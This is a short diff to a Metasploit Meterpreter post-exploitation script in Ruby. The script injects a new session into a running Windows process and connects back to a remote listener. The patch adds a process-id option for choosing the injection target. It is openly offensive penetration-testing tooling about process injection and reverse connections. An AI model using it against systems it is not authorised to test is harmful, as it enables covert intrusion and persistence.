@@ -15,7 +15,8 @@ opts = Rex::Parser::Arguments.new(
 	"-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4546)"],
 	"-w"  => [ false,  "Write and execute an exe instead of injecting into a process"],
-	"-P"  => [ true,   "Executable to inject into. Default notepad.exe, will fall back to spawn if not found."],
+	"-e"  => [ true,   "Executable to inject into. Default notepad.exe, will fall back to spawn if not found."],
+	"-P"  => [ true,   "Process id to inject into; use instead of -e if multiple copies of one executable are running."],
 	"-s"  => [ false,  "Spawn new executable to inject to.  Only useful with -P."],
 	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"]
 )
@@ -31,6 +32,7 @@ lhost    = "127.0.0.1"
 spawn = false
 autoconn = true
 inject   = true
+target_pid = nil
 target    = "notepad.exe"
 pay      = nil
 
@@ -47,6 +49,8 @@ opts.parse(args) do |opt, idx, val|
 	when "-p"
 		rport = val.to_i
 	when "-P"
+		target_pid = val.to_i
+	when "-e"
 		target = val
 	when "-D"
 		autoconn = false
@@ -108,7 +112,9 @@ if client.platform =~ /win32|win64/
 		print_status("Duplicating into #{target}...")
 
 		# Get the target process pid
-		target_pid = client.sys.process[target]
+		if not target_pid
+			target_pid = client.sys.process[target]
+		end
 
 		if not target_pid
 			print_error("Could not access the target process")
